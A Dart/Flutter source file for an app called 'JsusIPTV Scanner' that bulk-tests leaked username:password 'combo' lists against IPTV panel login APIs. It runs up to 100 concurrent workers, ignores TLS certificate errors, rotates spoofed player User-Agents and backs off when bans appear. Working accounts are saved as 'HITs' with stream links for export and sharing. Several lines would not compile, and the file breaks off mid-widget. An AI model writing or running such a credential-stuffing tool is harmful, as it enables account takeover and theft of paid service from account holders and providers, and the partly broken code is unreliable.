import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:file_picker/file_picker.dart';
import 'package:share_plus/share_plus.dart';
import 'package:path_provider/path_provider.dart';

void main() {
  runApp(const JsusIPTVApp());
}

// ═══ COLORS ═══
const cGreen = Color(0xFF00FF41);
const cGreen2 = Color(0xFF00C832);
const cCyan = Color(0xFF00E5FF);
const cYellow = Color(0xFFFFD600);
const cRed = Color(0xFFFF1744);
const cMagenta = Color(0xFFE040FB);
const cDarkGreen = Color(0xFF3A6B3A);
const cBg = Color(0xFF020402);
const cBg2 = Color(0xFF060D06);
const cCard = Color(0xFF080F08);
const cBorder = Color(0xFF0F2A0F);

// ═══ MODELS ═══
class ComboItem {
  final String user;
  final String pass;
  ComboItem(this.user, this.pass);
}

class HitItem {
  final String username, password, panel, expira, status, conex, activ, m3u, timezone;
  PanelInfo? panelInfo;
  final String id;
  HitItem({required this.username, required this.password, required this.panel,
    required this.expira, required this.status, required this.conex,
    required this.activ, required this.m3u, required this.timezone})
    : id = DateTime.now().millisecondsSinceEpoch.toString();
}

class PanelInfo {
  final int live, vod, series;
  PanelInfo(this.live, this.vod, this.series);
}

// ═══ SCANNER ENGINE ═══
class ScanEngine {
  static final _client = HttpClient()
    ..badCertificateCallback = (_, __, ___) => true
    ..connectionTimeout = const Duration(seconds: 10);

  static List<ComboItem> parseCombo(String text) {
    final lines = <ComboItem>[];
    final seen = <String>{};
    for (var line in text.split('\n')) {
      line = line.trim().replaceAll('\r', '').replaceAll('\uFEFF', '');
      if (line.isEmpty || line.startsWith('#') || line.startsWith('//')) continue;
      if (!line.contains(':')) continue;
      final idx = line.indexOf(':');
      final user = line.substring(0, idx).trim();
      final pass = line.substring(idx + 1).trim();
      if (user.isEmpty || pass.isEmpty) continue;
      if (user.startsWith('http') || user.startsWith('www')) continue;
      final key = '$user:$pass';
      if (!seen.contains(key)) {
        seen.add(key);
        lines.add(ComboItem(user, pass));
      }
    }
    return lines;
  }

  static Future<Map<String, dynamic>?> checkAccount(
      String panel, String user, String pass, int timeoutSec) async {
    try {
      final url = '$panel/player_api.php?username=${Uri.encodeComponent(user)}&password=${Uri.encodeComponent(pass)}';
      final request = await _client.getUrl(Uri.parse(url));
      request.headers.set('User-Agent', _randomUA());
      request.headers.set('Accept', '*/*');
      request.headers.set('Connection', 'keep-alive');
      final response = await request.close()
          .timeout(Duration(seconds: timeoutSec));
      if (response.statusCode >= 500) return null;
      final body = await response.transform(utf8.decoder).join();
      try {
        return jsonDecode(body) as Map<String, dynamic>;
      } catch {
        if (body.contains('"auth":1') || body.contains('"status":"Active"')) {
          return {'user_info': {'auth': 1, 'status': 'Active'}, 'server_info': {}};
        }
        return null;
      }
    } catch {
      return null;
    }
  }

  static Future<PanelInfo> verifyPanel(String panel, String user, String pass) async {
    int live = 0, vod = 0, series = 0;
    try {
      final futures = await Future.wait([
        _getCount(panel, user, pass, 'get_live_streams'),
        _getCount(panel, user, pass, 'get_vod_categories'),
        _getCount(panel, user, pass, 'get_series_categories'),
      ], eagerError: false);
      live = futures[0]; vod = futures[1]; series = futures[2];
    } catch {}
    return PanelInfo(live, vod, series);
  }

  static Future<int> _getCount(String panel, String user, String pass, String action) async {
    try {
      final url = '$panel/player_api.php?username=${Uri.encodeComponent(user)}&password=${Uri.encodeComponent(pass)}&action=$action';
      final request = await _client.getUrl(Uri.parse(url));
      request.headers.set('User-Agent', _randomUA());
      final response = await request.close().timeout(const Duration(seconds: 15));
      final body = await response.transform(utf8.decoder).join();
      final data = jsonDecode(body);
      if (data is List) return data.length;
    } catch {}
    return 0;
  }

  static const _uas = [
    'Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 Chrome/120.0 Mobile Safari/537.36',
    'VLC/3.0.20 LibVLC/3.0.20',
    'TiviMate/4.7.0',
    'IPTVSmarters/3.1.5',
    'okhttp/4.12.0',
    'Kodi/20.2 (Linux; Android 12.0)',
    'ExoPlayer/2.19.1',
    'Dalvik/2.1.0 (Linux; U; Android 13)',
  ];

  static String _randomUA() => _uas[DateTime.now().millisecondsSinceEpoch % _uas.length];
}

// ═══ MAIN APP ═══
class JsusIPTVApp extends StatelessWidget {
  const JsusIPTVApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'JsusIPTV Scanner',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        scaffoldBackgroundColor: cBg,
        colorScheme: const ColorScheme.dark(primary: cGreen, surface: cBg),
        fontFamily: 'monospace',
      ),
      home: const HomeScreen(),
    );
  }
}

// ═══ HOME ═══
class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});
  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> with TickerProviderStateMixin {
  int _tab = 0;
  final _servers = <String>[];
  String? _activeServer;
  final _combo = <ComboItem>[];
  String _comboName = '';
  final _proxies = <String>[];
  final _hits = <HitItem>[];
  final _logs = <String>[];

  // Scan state
  bool _scanning = false;
  bool _paused = false;
  int _checked = 0, _hitsN = 0, _fails = 0, _bans = 0, _total = 0;
  DateTime? _scanStart;
  Timer? _uiTimer;
  int _bots = 20;
  int _timeout = 10;

  late AnimationController _glowCtrl;
  late Animation<double> _glowAnim;

  @override
  void initState() {
    super.initState();
    _glowCtrl = AnimationController(vsync: this, duration: const Duration(seconds: 2))..repeat(reverse: true);
    _glowAnim = Tween<double>(begin: 0.3, end: 1.0).animate(_glowCtrl);
  }

  @override
  void dispose() {
    _glowCtrl.dispose();
    _uiTimer?.cancel();
    super.dispose();
  }

  void _log(String msg) {
    setState(() {
      _logs.insert(0, '[${TimeOfDay.now().format(context)}] $msg');
      if (_logs.length > 100) _logs.removeLast();
    });
  }

  // ═══ COMBO ═══
  Future<void> _loadCombo() async {
    final result = await FilePicker.platform.pickFiles(
      type: FileType.custom, allowedExtensions: ['txt']);
    if (result == null) return;
    final file = File(result.files.single.path!);
    final text = await file.readAsString();
    final parsed = ScanEngine.parseCombo(text);
    setState(() {
      _combo.clear();
      _combo.addAll(parsed);
      _comboName = result.files.single.name;
    });
    _log('COMBO: ${result.files.single.name} — ${parsed.length} líneas');
  }

  // ═══ SCAN ═══
  Future<void> _startScan() async {
    if (_activeServer == null) { _showToast('⚠ Configura servidor'); return; }
    if (_combo.isEmpty) { _showToast('⚠ Carga combo'); return; }
    setState(() {
      _scanning = true; _paused = false;
      _checked = 0; _hitsN = 0; _fails = 0; _bans = 0;
      _total = _combo.length;
      _scanStart = DateTime.now();
    });
    _log('SCAN ▶ ${_total} combos — $_bots bots');
    _uiTimer = Timer.periodic(const Duration(milliseconds: 400), (_) => setState(() {}));
    final shuffled = List<ComboItem>.from(_combo)..shuffle();
    await _runWorkers(shuffled);
  }

  Future<void> _runWorkers(List<ComboItem> queue) async {
    int pos = 0;
    int active = 0;
    final completer = Completer<void>();

    void checkDone() {
      if (_checked >= _total && active == 0) {
        if (!completer.isCompleted) completer.complete();
      }
    }

    Future<void> worker(ComboItem item) async {
      while (_paused && _scanning) {
        await Future.delayed(const Duration(milliseconds: 100));
      }
      if (!_scanning) { active--; checkDone(); return; }

      final data = await ScanEngine.checkAccount(
          _activeServer!, item.user, item.pass, _timeout);

      setState(() { _checked++; });

      if (data != null) {
        final ui = data['user_info'] as Map? ?? {};
        final si = data['server_info'] as Map? ?? {};
        final auth = ui['auth'];
        final status = (ui['status'] ?? '').toString().toLowerCase();
        final isHit = auth == 1 || auth == '1' || auth == true ||
            ['active','activo','enabled','1','premium','trial','free'].contains(status);

        if (isHit && status != 'banned' && status != 'disabled') {
          String exp = 'Ilimitado';
          final expTs = ui['exp_date'];
          if (expTs != null && int.tryParse(expTs.toString()) != null) {
            final ts = int.parse(expTs.toString());
            if (ts > 0) {
              exp = DateTime.fromMillisecondsSinceEpoch(ts * 1000)
                  .toString().split(' ')[0];
            }
          }
          final hit = HitItem(
            username: item.user, password: item.pass,
            panel: _activeServer!,
            expira: exp,
            status: (ui['status'] ?? 'Active').toString(),
            conex: (ui['max_connections'] ?? '?').toString(),
            activ: (ui['active_cons'] ?? '0').toString(),
            m3u: '$_activeServer/get.php?username=${item.user}&password=${item.pass}&type=m3u_plus',
            timezone: (si['timezone'] ?? '').toString(),
          );
          setState(() { _hits.insert(0, hit); _hitsN++; });
          _log('HIT #$_hitsN: ${item.user} → $exp');
          // Verificar panel
          ScanEngine.verifyPanel(_activeServer!, item.user, item.pass).then((info) {
            setState(() { hit.panelInfo = info; });
            _log('PANEL: ${item.user} 📺${info.live} 🎬${info.vod} 📺${info.series}');
          });
        } else {
          setState(() { _fails++; });
        }
      } else {
        setState(() { _fails++; });
      }

      final banRatio = _bans / (_checked > 0 ? _checked : 1);
      final delay = banRatio > 0.3 ? 200 : banRatio > 0.1 ? 80 : 10;
      await Future.delayed(Duration(milliseconds: delay));
      active--;
      checkDone();
    }

    while (pos < queue.length && _scanning) {
      if (active < _bots && !_paused) {
        active++;
        worker(queue[pos++]);
      } else {
        await Future.delayed(const Duration(milliseconds: 20));
      }
    }

    await completer.future.timeout(const Duration(hours: 24), onTimeout: () {});
    _finishScan();
  }

  void _finishScan() {
    _uiTimer?.cancel();
    setState(() { _scanning = false; });
    _log('FIN ✓ Hits: $_hitsN | Fail: $_fails | Bans: $_bans');
    _showToast('✓ Fin — $_hitsN HITs');
  }

  // ═══ EXPORT ═══
  Future<void> _exportHits() async {
    if (_hits.isEmpty) { _showToast('No hay hits'); return; }
    final buf = StringBuffer('JsusIPTV Scanner — HITS\n${'=' * 50}\n\n');
    for (var i = 0; i < _hits.length; i++) {
      final h = _hits[i];
      buf.writeln('HIT #${i+1}');
      buf.writeln('USER   : ${h.username}');
      buf.writeln('PASS   : ${h.password}');
      buf.writeln('SERVER : ${h.panel}');
      buf.writeln('EXPIRA : ${h.expira}');
      buf.writeln('CONEX  : ${h.activ}/${h.conex}');
      buf.writeln('ESTADO : ${h.status}');
      if (h.panelInfo != null) {
        buf.writeln('CANALES: ${h.panelInfo!.live}');
        buf.writeln('VOD    : ${h.panelInfo!.vod}');
        buf.writeln('SERIES : ${h.panelInfo!.series}');
      }
      buf.writeln('M3U    : ${h.m3u}');
      buf.writeln('${'─' * 40}\n');
    }
    final dir = await getExternalStorageDirectory();
    final file = File('${dir!.path}/JsusIPTV_Hits_${DateTime.now().toIso8601String().split('T')[0]}.txt');
    await file.writeAsString(buf.toString());
    Share.shareXFiles([XFile(file.path)], text: 'JsusIPTV Hits');
    _showToast('✓ Exportado');
  }

  void _showToast(String msg) {
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text(msg, style: const TextStyle(color: cGreen, fontFamily: 'monospace')),
      backgroundColor: cCard,
      duration: const Duration(seconds: 2),
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(4),
        side: const BorderSide(color: cBorder),
      ),
    ));
  }

  String get _elapsed {
    if (_scanStart == null) return '00:00:00';
    final d = DateTime.now().difference(_scanStart!);
    return '${d.inHours.toString().padLeft(2,'0')}:${(d.inMinutes%60).toString().padLeft(2,'0')}:${(d.inSeconds%60).toString().padLeft(2,'0')}';
  }

  int get _cpm {
    if (_scanStart == null || _checked == 0) return 0;
    final secs = DateTime.now().difference(_scanStart!).inSeconds;
    return secs > 0 ? (_checked / secs * 60).round() : 0;
  }

  double get _pct => _total > 0 ? _checked / _total : 0;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: cBg,
      body: SafeArea(
        child: Column(children: [
          _buildHeader(),
          _buildNav(),
          Expanded(child: _buildContent()),
        ]),
      ),
    );
  }

  // ═══ HEADER ═══
  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 10),
      decoration: BoxDecoration(
        color: cBg2,
        border: Border(bottom: BorderSide(color: cBorder)),
      ),
      child: Row(children: [
        ClipRRect(
          borderRadius: BorderRadius.circular(9),
          child: Image.asset('android-icon/icon.png', width: 40, height: 40,
            errorBuilder: (_, __, ___) => Container(
              width: 40, height: 40,
              decoration: BoxDecoration(
                color: cCard,
                borderRadius: BorderRadius.circular(9),
                border: Border.all(color: cBorder),
              ),
              child: const Center(child: Text('Js', style: TextStyle(color: cGreen, fontSize: 14, fontWeight: FontWeight.bold))),
            ),
          ),
        ),
        const SizedBox(width: 10),
        Expanded(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          AnimatedBuilder(
            animation: _glowAnim,
            builder: (_, __) => Text.rich(TextSpan(children: [
              TextSpan(text: 'Jsus', style: TextStyle(color: cCyan,
                shadows: [Shadow(color: cCyan.withOpacity(_glowAnim.value), blurRadius: 15)])),
              TextSpan(text: 'IPTV Scanner', style: TextStyle(color: cGreen,
                shadows: [Shadow(color: cGreen.withOpacity(_glowAnim.value), blurRadius: 15)])),
            ], style: const TextStyle(fontSize: 16, fontWeight: FontWeight.bold, letterSpacing: 1))),
          ),
          const Text('PRO v5.0 · POTENCIA · PRECISION · VELOCIDAD',
            style: TextStyle(fontSize: 8, color: cDarkGreen, letterSpacing: 2)),
        ])),
        Column(crossAxisAlignment: CrossAxisAlignment.end, children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
            decoration: BoxDecoration(
              color: cBg,
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: cBorder),
            ),
            child: Row(mainAxisSize: MainAxisSize.min, children: [
              AnimatedBuilder(
                animation: _glowAnim,
                builder: (_, __) => Container(
                  width: 6, height: 6,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: _scanning ? cGreen : cRed,
                    boxShadow: [BoxShadow(
                      color: (_scanning ? cGreen : cRed).withOpacity(_scanning ? _glowAnim.value : 0.5),
                      blurRadius: 8,
                    )],
                  ),
                ),
              ),
              const SizedBox(width: 4),
              Text(_scanning ? 'SCAN' : 'IDLE',
                style: const TextStyle(fontSize: 9, color: cDarkGreen, letterSpacing: 1)),
            ]),
          ),
          const SizedBox(height: 3),
          StreamBuilder(
            stream: Stream.periodic(const Duration(seconds: 1)),
            builder: (_, __) => Text(
              TimeOfDay.now().format(context),
              style: const TextStyle(fontSize: 9, color: cDarkGreen),
            ),
          ),
        ]),
      ]),
    );
  }

  // ═══ NAV ═══
  Widget _buildNav() {
    final tabs = [
      ('⚡', 'SCAN'), ('⚙️', 'CONFIG'), ('🎯', 'HITS'), ('🔗', 'PROXY')];
    return Container(
      decoration: BoxDecoration(
        color: cBg2,
        border: Border(bottom: BorderSide(color: cBorder)),
      ),
      child: Row(children: List.generate(tabs.length, (i) {
        final active = _tab == i;
        return Expanded(child: GestureDetector(
          onTap: () => setState(() => _tab = i),
          child: Container(
            padding: const EdgeInsets.symmetric(vertical: 8),
            decoration: BoxDecoration(
              border: Border(bottom: BorderSide(
                color: active ? cGreen : Colors.transparent, width: 2)),
            ),
            child: Column(mainAxisSize: MainAxisSize.min, children: [
              Text(tabs[i].$1, style: const TextStyle(fontSize: 15)),
              Text(tabs[i].$2, style: TextStyle(
                fontSize: 10, fontWeight: FontWeight.bold,
                color: active ? cGreen : cDarkGreen,
                letterSpacing: 1,
                shadows: active ? [const Shadow(color: cGreen, blurRadius: 8)] : null,
              )),
            ]),
          ),
        ));
      })),
    );
  }

  // ═══ CONTENT ═══
  Widget _buildContent() {
    switch (_tab) {
      case 0: return _buildScanTab();
      case 1: return _buildConfigTab();
      case 2: return _buildHitsTab();
      case 3: return _buildProxyTab();
      default: return _buildScanTab();
    }
  }

  // ═══ SCAN TAB ═══
  Widget _buildScanTab() {
    return ListView(padding: const EdgeInsets.all(10), children: [
      if (_scanning) ...[
        _card(color: cGreen, child: Column(children: [
          Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            _runBadge(),
            Text(_elapsed, style: const TextStyle(fontSize: 10, color: cDarkGreen)),
          ]),
          const SizedBox(height: 10),
          _progressBar(),
          const SizedBox(height: 10),
          _statsGrid(),
          const SizedBox(height: 10),
          Row(children: [
            Expanded(child: _btn(
              _paused ? '▶ REANUDAR' : '⏸ PAUSAR',
              color: _paused ? cGreen : cYellow,
              onTap: () => setState(() => _paused = !_paused),
            )),
            const SizedBox(width: 8),
            Expanded(child: _btn('⬛ DETENER', color: cRed,
              onTap: () { setState(() => _scanning = false); })),
          ]),
        ])),
      ] else ...[
        _card(color: cCyan, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          _cardTitle('SERVIDOR ACTIVO'),
          Text(_activeServer ?? 'Sin servidor configurado',
            style: TextStyle(fontSize: 11, color: _activeServer != null ? cCyan : cDarkGreen)),
          const SizedBox(height: 8),
          _smallBtn('⚙ CONFIGURAR', color: cCyan,
            onTap: () => setState(() => _tab = 1)),
        ])),
        _card(color: cYellow, child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          _cardTitle('COMBO'),
          Text(_combo.isEmpty ? 'Sin combo cargado' : '$_comboName — ${_combo.length.toLocaleString()} líneas',
            style: TextStyle(fontSize: 11, color: _combo.isEmpty ? cDarkGreen : cYellow)),
          const SizedBox(height: 8),
          _smallBtn('📂 CARGAR COMBO', color: cYellow, onTap: _loadCombo),
        ])),
        _card(child: Column(children: [
          _cardTitle('BOTS'),
          Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
            const Text('SIMULTÁNEOS', style: TextStyle(fontSize: 9, color: cDarkGreen, letterSpacing: 2)),
            Text('$_bots', style: const TextStyle(fontSize: 18, color: cGreen,
              shadows: [Shadow(color: cGreen, blurRadius: 8)])),
          ]),
          Slider(
            value: _bots.toDouble(), min: 1, max: 100,
            activeColor: cGreen, inactiveColor: cBorder,
            onChanged: (v) => setState(() => _bots = v.round()),
          ),
          Row(children: [
            Expanded(child: _infoBox('PROXY', _proxies.isEmpty ? 'Directo' : '${_proxies.length} px', cMagenta)),
            const SizedBox(width: 7),
            Expanded(child: _infoBox('TIMEOUT', '${_timeout}s', cCyan)),
          ]),
        ])),
        _card(child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          _cardTitle('LOG'),
          Container(
            height: 100,
            decoration: BoxDecoration(color: const Color(0xFF010201), borderRadius: BorderRadius.circular(3)),
            child: ListView.builder(
              padding: const EdgeInsets.all(6),
              reverse: false,
              itemCount: _logs.length,
              itemBuilder: (_, i) => Text(_logs[i],
                style: TextStyle(fontSize: 9, color: _logColor(_logs[i]), height: 1.7)),
            ),
          ),
        ])),
        _btn('⚡ INICIAR ESCANEO', color: cGreen, onTap: _startScan),
      ],
    ]);
  }

  Color _logColor(String log) {
    if (log.contains('HIT')) return cGreen;
    if (log.contains('ERROR') || log.contains('FAIL')) return cRed;
    if (log.contains('WARN') || log.contains('PAUSAD')) return cYellow;
    if (log.contains('PANEL') || log.contains('SRV')) return cCyan;
    return cDarkGreen;
  }

  Widget _runBadge() => Container(
    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
    decoration: BoxDecoration(
      color: cGreen.withOpacity(0.07),
      borderRadius: BorderRadius.circular(10),
      border: Border.all(color: cGreen.withOpacity(0.2)),
    ),
    child: Row(mainAxisSize: MainAxisSize.min, children: [
      AnimatedBuilder(
        animation: _glowAnim,
        builder: (_, __) => Container(
          width: 5, height: 5,
          decoration: BoxDecoration(
            shape: BoxShape.circle, color: cGreen,
            boxShadow: [Shadow(color: cGreen.withOpacity(_glowAnim.value), blurRadius: 8) as BoxShadow],
          ),
        ),
      ),
      const SizedBox(width: 5),
      const Text('ESCANEANDO', style: TextStyle(fontSize: 9, color: cGreen, letterSpacing: 2)),
    ]),
  );

  Widget _progressBar() => Column(children: [
    Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
      Text('${(_pct * 100).toStringAsFixed(1)}%',
        style: const TextStyle(fontSize: 14, color: cGreen,
          shadows: [Shadow(color: cGreen, blurRadius: 10)], fontFamily: 'monospace')),
      Text('${_checked.toLocaleString()} / ${_total.toLocaleString()}',
        style: const TextStyle(fontSize: 9, color: cDarkGreen, letterSpacing: 1)),
    ]),
    const SizedBox(height: 6),
    ClipRRect(
      borderRadius: BorderRadius.circular(3),
      child: LinearProgressIndicator(
        value: _pct,
        backgroundColor: cBorder,
        valueColor: const AlwaysStoppedAnimation(cGreen),
        minHeight: 6,
      ),
    ),
  ]);

  Widget _statsGrid() => Column(children: [
    Row(children: [
      Expanded(child: _statBox('HITS', '$_hitsN', cGreen)),
      const SizedBox(width: 7),
      Expanded(child: _statBox('FAIL', _fails.toLocaleString(), cRed)),
    ]),
    const SizedBox(height: 7),
    Row(children: [
      Expanded(child: _statBox('BANS', '$_bans', cYellow)),
      const SizedBox(width: 7),
      Expanded(child: _statBox('CPM', _cpm.toLocaleString(), cYellow, big: true)),
    ]),
  ]);

  Widget _statBox(String label, String val, Color color, {bool big = false}) => Container(
    padding: const EdgeInsets.all(10),
    decoration: BoxDecoration(
      color: cBg,
      borderRadius: BorderRadius.circular(4),
      border: Border.all(color: cBorder),
    ),
    child: Column(children: [
      Text(val, style: TextStyle(
        fontSize: big ? 28 : 24, fontWeight: FontWeight.bold,
        color: color, letterSpacing: -1,
        shadows: [Shadow(color: color, blurRadius: 20)],
        fontFamily: 'monospace',
      )),
      Text(label, style: const TextStyle(fontSize: 8, color: cDarkGreen, letterSpacing: 2)),
    ]),
  );

  // ═══ CONFIG TAB ═══
  Widget _buildConfigTab() {
    return ListView(padding: const EdgeInsets.all(10), children: [
      _sectionTitle('SERVIDOR'),
      _card(color: cCyan, child: Column(children: [
        _cardTitle('AGREGAR'),
        _input('http://panel.com:8080', id: 'srv'),
        const SizedBox(height: 8),
        _btn('✓ AGREGAR SERVIDOR', color: cCyan, onTap: _addServer),
        const SizedBox(height: 8),
        _sectionTitle('ACTIVOS'),
        if (_servers.isEmpty)
          _empty('🖥️', 'Sin servidores')
        else
          ..._servers.asMap().entries.map((e) => Container(
            margin: const EdgeInsets.only(bottom: 5),
            padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 7),
            decoration: BoxDecoration(
              color: cBg,
              borderRadius: BorderRadius.circular(3),
              border: Border.all(color: cBorder),
            ),
            child: Row(children: [
              Expanded(child: Text(e.value,
                style: const TextStyle(fontSize: 10, color: cCyan))),
              GestureDetector(
                onTap: () => setState(() {
                  _servers.removeAt(e.key);
                  _activeServer = _servers.isNotEmpty ? _servers[0] : null;
                }),
                child: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                  decoration: BoxDecoration(
                    color: cRed.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(3),
                    border: Border.all(color: cRed.withOpacity(0.3)),
                  ),
                  child: const Text('✕', style: TextStyle(color: cRed, fontSize: 12)),
                ),
              ),
            ]),
          )),
      ])),
      _sectionTitle('TIMEOUT'),
      _card(child: Column(children: [
        Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
          const Text('SEGUNDOS', style: TextStyle(fontSize: 9, color: cDarkGreen, letterSpacing: 2)),
          Text('${_timeout}s', style: const TextStyle(fontSize: 18, color: cGreen,
            shadows: [Shadow(color: cGreen, blurRadius: 8)], fontFamily: 'monospace')),
        ]),
        Slider(
          value: _timeout.toDouble(), min: 5, max: 30,
          activeColor: cGreen, inactiveColor: cBorder,
          onChanged: (v) => setState(() => _timeout = v.round()),
        ),
      ])),
    ]);
  }

  final _srvController = TextEditingController();

  void _addServer() {
    final raw = _srvController.text.trim();
    if (raw.isEmpty) { _showToast('⚠ Ingresa URL'); return; }
    var url = raw;
    if (!url.startsWith('http')) url = 'http://$url';
    url = url.replaceAll(RegExp(r'/+$'), '');
    if (_servers.contains(url)) { _showToast('Ya existe'); return; }
    setState(() {
      _servers.add(url);
      _activeServer = url;
    });
    _srvController.clear();
    _showToast('✓ Servidor agregado');
    _log('SRV: $url agregado');
    // Verificar servidor
    _verifyServer(url);
  }

  Future<void> _verifyServer(String url) async {
    _log('SRV: Verificando $url...');
    try {
      final client = HttpClient()..badCertificateCallback = (_, __, ___) => true;
      final req = await client.getUrl(
        Uri.parse('$url/player_api.php?username=test&password=test'))
        .timeout(const Duration(seconds: 6));
      final res = await req.close().timeout(const Duration(seconds: 6));
      if (res.statusCode < 500) {
        _log('SRV: ✓ ACTIVO (${res.statusCode}) — $url');
        _showToast('✓ Servidor activo');
      } else {
        _log('SRV: ⚠ Responde con error ${res.statusCode}');
      }
    } catch {
      _log('SRV: ✗ No responde — $url');
      _showToast('⚠ Sin respuesta — agregado de todas formas');
    }
  }

  // ═══ HITS TAB ═══
  Widget _buildHitsTab() {
    return Column(children: [
      Padding(
        padding: const EdgeInsets.all(10),
        child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
          Text('TOTAL: ${_hits.length}',
            style: const TextStyle(fontSize: 12, color: cDarkGreen,
              fontWeight: FontWeight.bold, letterSpacing: 2)),
          Row(children: [
            _smallBtn('💾 EXPORTAR', color: cCyan, onTap: _exportHits),
            const SizedBox(width: 6),
            _smallBtn('🗑 LIMPIAR', color: cRed,
              onTap: () => setState(() => _hits.clear())),
          ]),
        ]),
      ),
      Expanded(child: _hits.isEmpty
        ? _empty('🎯', 'LOS HITS APARECERÁN AQUÍ')
        : ListView.builder(
          padding: const EdgeInsets.symmetric(horizontal: 10),
          itemCount: _hits.length,
          itemBuilder: (_, i) => _hitCard(_hits[i], i),
        )),
    ]);
  }

  Widget _hitCard(HitItem h, int i) => Container(
    margin: const EdgeInsets.only(bottom: 10),
    decoration: BoxDecoration(
      gradient: LinearGradient(colors: [
        const Color(0xFF002300), const Color(0xFF000F00)]),
      borderRadius: BorderRadius.circular(6),
      border: Border(
        left: const BorderSide(color: cGreen, width: 2),
        top: BorderSide(color: cGreen.withOpacity(0.2)),
        right: BorderSide(color: cGreen.withOpacity(0.1)),
        bottom: BorderSide(color: cGreen.withOpacity(0.1)),
      ),
    ),
    child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
      Padding(
        padding: const EdgeInsets.fromLTRB(12, 10, 12, 8),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          Text('👤 ${h.username}', style: const TextStyle(color: cGreen, fontSize: 13, fontWeight: FontWeight.bold)),
          Text('🔑 ${h.password}', style: const TextStyle(color: cDarkGreen, fontSize: 10)),
          Text('🖥 ${h.panel}', style: const TextStyle(color: cCyan, fontSize: 9)),
          const SizedBox(height: 6),
          Wrap(spacing: 5, runSpacing: 4, children: [
            _badge('📅 ${h.expira}', cYellow),
            _badge('🔗 ${h.activ}/${h.conex}', cCyan),
            _badge('✓ ${h.status}', cGreen),
            if (h.timezone.isNotEmpty) _badge('🌍 ${h.timezone}', cMagenta),
          ]),
        ]),
      ),
      Container(
        padding: const EdgeInsets.fromLTRB(12, 8, 12, 8),
        decoration: BoxDecoration(
          border: Border(top: BorderSide(color: cGreen.withOpacity(0.08))),
        ),
        child: Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
          const Text('📊 VERIFICACIÓN DE PANEL',
            style: TextStyle(fontSize: 10, color: cDarkGreen, letterSpacing: 2)),
          const SizedBox(height: 8),
          h.panelInfo == null
            ? const Row(children: [
                SizedBox(width: 16, height: 16,
                  child: CircularProgressIndicator(strokeWidth: 2, color: cGreen)),
                SizedBox(width: 8),
                Text('Verificando panel...', style: TextStyle(fontSize: 10, color: cDarkGreen)),
              ])
            : Row(children: [
                Expanded(child: _panelBox('📺', '${h.panelInfo!.live}', 'CANALES', cGreen)),
                const SizedBox(width: 5),
                Expanded(child: _panelBox('🎬', '${h.panelInfo!.vod}', 'VOD', cCyan)),
                const SizedBox(width: 5),
                Expanded(child: _panelBox('📺', '${h.panelInfo!.series}', 'SERIES', cMagenta)),
              ]),
        ]),
      ),
      Padding(
        padding: const EdgeInsets.fromLTRB(12, 0, 12, 10),
        child: Row(children: [
          _smallBtn('📋 COPIAR', color: cCyan, onTap: () => _copyHit(h)),
          const SizedBox(width: 6),
          _smallBtn('📺 M3U', color: cGreen, onTap: () {
            Clipboard.setData(ClipboardData(text: h.m3u));
            _showToast('✓ M3U copiado');
          }),
          const SizedBox(width: 6),
          _smallBtn('🔄 VERIFICAR', color: cMagenta, onTap: () async {
            setState(() => h.panelInfo = null);
            final info = await ScanEngine.verifyPanel(h.panel, h.username, h.password);
            setState(() => h.panelInfo = info);
            _showToast('✓ Panel verificado');
          }),
        ]),
      ),
    ]),
  );

  Widget _panelBox(String icon, String val, String label, Color color) => Container(
    padding: const EdgeInsets.all(7),
    decoration: BoxDecoration(
      color: cBg,
      borderRadius: BorderRadius.circular(4),
      border: Border.all(color: cBorder),
    ),
    child: Column(children: [
      Text(_fmtNum(int.tryParse(val) ?? 0),
        style: TextStyle(fontSize: 16, fontWeight: FontWeight.bold,
          color: color, shadows: [Shadow(color: color, blurRadius: 10)],
          fontFamily: 'monospace')),
      Text(label, style: const TextStyle(fontSize: 8, color: cDarkGreen, letterSpacing: 1)),
    ]),
  );

  String _fmtNum(int n) => n >= 1000 ? '${(n/1000).toStringAsFixed(1)}k' : '$n';

  void _copyHit(HitItem h) {
    var txt = 'SERVER: ${h.panel}\nUSER: ${h.username}\nPASS: ${h.password}\nEXP: ${h.expira}\nCONEX: ${h.activ}/${h.conex}';
    if (h.panelInfo != null) {
      txt += '\nCANALES: ${h.panelInfo!.live}\nVOD: ${h.panelInfo!.vod}\nSERIES: ${h.panelInfo!.series}';
    }
    txt += '\nM3U: ${h.m3u}';
    Clipboard.setData(ClipboardData(text: txt));
    _showToast('✓ Copiado');
  }

  // ═══ PROXY TAB ═══
  Widget _buildProxyTab() {
    return ListView(padding: const EdgeInsets.all(10), children: [
      _card(color: cMagenta, child: Column(children: [
        _cardTitle('CARGAR PROXIES'),
